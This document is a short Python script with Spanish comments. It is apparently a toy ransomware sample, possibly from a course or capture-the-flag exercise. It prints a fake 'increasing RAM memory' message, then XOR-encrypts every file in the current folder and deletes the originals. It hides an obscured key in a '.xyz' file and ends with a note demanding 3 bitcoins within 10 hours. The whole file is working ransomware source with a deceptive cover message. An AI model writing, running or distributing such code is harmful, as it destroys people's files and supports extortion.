# -*- coding: utf-8 -*-
from sys import argv,version_info
import os
assert version_info[0] == 3, 'USA PYTHON 3'
print('Aumentando memoria RAM, espera...')

# Función que encripta los archivos con la llave k
def xx(x):
 with open(x+'.enc','wb') as z:
  z.write((lambda x:bytes([x[i]^k[i%16] for i in range(len(x))]))(open(x,'rb').read()))
 os.remove(x)

# Obtenemos los archivos de la carpeta actual
_,_,x = next(os.walk('./'))
# Obtenemos sólo los archivos
x.remove(argv[0])
# Se guarda el . en representación de bytes
y = '\x2e'
# Renombramos la función urandom
r = os.urandom
# Obtenemos una llave aleatoria de 16 bytes
k = r(16)
# Aplicamos la función de cifrado a todos los archivo
list(map(xx,x))
# Obtenemos la representación en enteros de la llave k
d,k=map(lambda x:int.from_bytes(k,'big'),[0xba,0xbe])
# Le aplicamos el or a la variable d
d|=1
# Le concatenamos la x al punto. Entonces tenemos .x
y+='\x78'
# Le hacemos un corrimiento de bits a un byte aleatorio
c = r(1)[0]|(1<<7)
# Aplicamos un módulo a la llave
k = d*k%(1<<c)
# A las variables d y k los pasamos a bytes 
d,k=map(lambda x:x.to_bytes(32,'big'),[d,k])
# Pasamos a c a bytes
c = bytes([c])
# Concatenamos yz a .x
y+='\x79\x7a'
# Guardamos las variables c, d y k en el archivo .xyz
with open(y,'wb') as z:
 z.write(c+d+k)
print('\n😈😈😈😈 Archivos encriptados JAJAJAJA 😈😈😈😈\nDame 3 bitcoins en 10 horas o morirán para siempre')